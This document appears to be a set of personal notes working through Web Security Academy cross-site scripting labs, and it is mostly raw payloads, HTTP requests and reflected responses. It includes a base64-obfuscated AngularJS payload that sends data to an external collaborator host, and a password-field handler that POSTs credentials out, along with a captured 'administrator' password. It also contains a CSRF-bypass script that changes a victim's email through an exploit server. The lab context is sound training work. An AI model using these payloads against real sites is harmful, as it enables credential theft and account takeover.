# XSS


### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source


Always look for what you can control the most out of the reflected input

```r
GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/2
Host: 0a59009804e1b247802612cd009300d1.web-security-academy.net
Cookie: session=WdzoAfMJKFUctbN1D6VQSKudP7mZKudx
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```


### 

```
https://0af7007a04d09e8b8345a08a00d90076.web-security-academy.net/?search=%22%3E%20onmouseover=%22alert(1)
```

This is interesting, the angle brackets were being encoded but the tags we have like `onmouseover` and others, will end up working fine with the embedded JS
```html
                   <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search value=""&gt; onmouseover="alert(1)">
                            <button type=submit class=button>Search</button>
                            
```


###


In exploit server, entering this, since it s on the selector sink and the vulnerable code does it so by using the `window.location.hash`, it takes the anchor and pass it to the dynamically generated html code but since this can be controlled, all we need to do is 
make use of the `onload` to load the JS via `img` tag's `onerror` attribute:

```js
window.location.hash
'#identity-theft'
window.location.hash.slice(1)
'identity-theft'
```

```
<iframe src="https://0ae700d2037e425782f96ac500b40033.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```



```js
                    <script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
```



### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

This is rather easy, always check the input being reflected to URL

```
POST /post/comment HTTP/2
Host: 0ad8002e03ce5bb280863a7600e10073.web-security-academy.net
Cookie: session=RacCIOrvzmYakwTGZVmmX8kD3E5lrQY5
Content-Length: 159
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0ad8002e03ce5bb280863a7600e10073.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad8002e03ce5bb280863a7600e10073.web-security-academy.net/post?postId=7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i

csrf=kKfp0Y3NXrQtE929mw6DCapVONJNqpTO&postId=7&comment=1&name=%22%3C%3E%21%40%23%24%25%5E%26*%28%29hello%3B&email=hello%40world.com&website=javascript:alert(1)
```


```js
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="javascript:alert(1)">&quot;&lt;&gt;!@#$%^&amp;*()hello;</a> | 18 November 2025
                        </p>
                        <p>1</p>
                        <p></p>
```


### Reflected XSS into a JavaScript string with angle brackets HTML encoded

This was rather easy, careful to not break the code

```
https://0af50068038f8f2c801744f900bd003b.web-security-academy.net/?search=helloworld%27;%0aalert(1);%0Ax=%27
```

```js
                   <script>
                        var searchTerms = 'helloworld';
alert(1);
x='';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
                    <section class="blog-list no-results">
                        <div class=is-linkback>
        <a href="/">Back to Blog
```


### Stored DOM XSS


Definitely was not aware that `replace` of JS only works for first occurence when the first argument is string. We just add dummy brackets before our payload and let replace do it works and then add the payload mentioned to exploit the DOM XSS.

```JS
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
undefined
esca
VM112:1 Uncaught ReferenceError: esca is not defined
    at <anonymous>:1:1
(anonymous) @ VM112:1Understand this error
escapeHTML("<><img src=1 onerror=alert(1)>\r\n")
'&lt;&gt;<img src=1 onerror=alert(1)>\r\n'
```



### Reflected DOM XSS


In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
Back in the lab, go to the target website and use the search bar to search for a random test string, such as "XSS".
Return to the Proxy tool in Burp Suite and forward the request.
On the Intercept tab, notice that the string is reflected in a JSON response called search-results.
From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call.
By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
To solve this lab, enter the following search term:

`\"-alert(1)}//`

As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.

An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:

`{"searchTerm":"\\"-alert(1)}//", "results":[]}`

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}


```


###


AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

```r
GET /?search={{$on.constructor('alert(1)')()}} HTTP/2
Host: 0a410025046dd30280555d1f0090004e.web-security-academy.net
 http/2: 
Cookie: session=6UOTz2ztwcmQm9DRsEOyjJHhqTV7hw2V
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a410025046dd30280555d1f0090004e.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```

Taking a bit further! 

```
https://0a410025046dd30280555d1f0090004e.web-security-academy.net/?search={{$on.constructor('eval(atob(\'dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCAnaHR0cHM6Ly95amxvNzl2emtqbWE3enBycm9laDJlMHpjcWluNmR1Mi5vYXN0aWZ5LmNvbT9kb21haW49JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5kb21haW4pLCB0cnVlKTt4aHIud2l0aENyZWRlbnRpYWxzID0gZmFsc2U7IHR4aHIuc2VuZCgpOw==\'))')()}}
```

### Reflected XSS into HTML context with all tags blocked except custom ones

This is good, gotta learn some JS shit

```js
<script>
location = 'https://0a29002404f4423880a9034100de008a.web-security-academy.net/?search=<img2 id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```


### Exploiting XSS to bypass CSRF defenses


```js
var getXhr = new XMLHttpRequest();
getXhr.open("GET", "/my-account", true);

getXhr.onreadystatechange = function () {
    if (getXhr.readyState === 4 && getXhr.status === 200) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(getXhr.responseText, "text/html");
        var token = doc.querySelector("input[name='csrf']").value;
        var postXhr = new XMLHttpRequest();
        postXhr.open("POST", "/my-account/change-email", true);
        postXhr.send("key=value&csrf=" + encodeURIComponent(token));
    }
};
getXhr.send();

```


### Exploiting XSS to bypass CSRF defenses


```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://qwqgk18rxbz2kr2j4gr9f6drpivfj77w.oastify.com',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
  });
">
```

```4
POST / HTTP/1.1
Host: qwqgk18rxbz2kr2j4gr9f6drpivfj77w.oastify.com
Connection: keep-alive
Content-Length: 34
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0ac500cb03b8592980982b3000d6006b.web-security-academy.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://0ac500cb03b8592980982b3000d6006b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9

administrator:b7fb0w8kfqrib5jdlw8x
```




 
### Lab: Reflected XSS with some SVG markup allowed


```
https://0a8100ef039b6620801d17c400a00071.h1-web-security-academy.net/?search=hello+world%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```


### Reflected XSS into a JavaScript string with single quote and backslash escaped


```r
https://0a74002704aafdcf80278a1c00c6009c.web-security-academy.net/?search=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
```

```html
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <script>
                        var searchTerms = '</script><script>alert(1)</script>';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
                    <section class="blog-list no-results">
                        <div class=is-linkback>
        <a href="/">Back to Blog</a>
                        </div>
```



### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped



```r
POST /post/comment HTTP/2
Host: 0ac1008a03e47675808917a1001a00ce.web-security-academy.net
Cookie: session=Py1HQ8HMIhWowDLV2Np7q7zpS2J9smvx
Content-Length: 195
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0ac1008a03e47675808917a1001a00ce.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac1008a03e47675808917a1001a00ce.web-security-academy.net/post?postId=9
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i

csrf=sSWOqBO8O2M1JF8kzHi9ODgGiSNi9Yhj&postId=9&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=hello&email=world%40hello.com&website=http%3A%2F%2Ffoo%3F%26apos%3B%2Dalert%281%29%2D%26apos%3B
```


### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped


```
https://0ad600d503881c6a8270ca1a00be00c9.web-security-academy.net/?search=${alert(1)}
```



### Reflected XSS protected by very strict CSP, with dangling markup attack


```js
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0ae900a8033b8fd98215251200d500fc.web-security-academy.net/";
const exploitServer = "https://exploit-0ac8004a03f18fc082ec24d5011f005e.exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```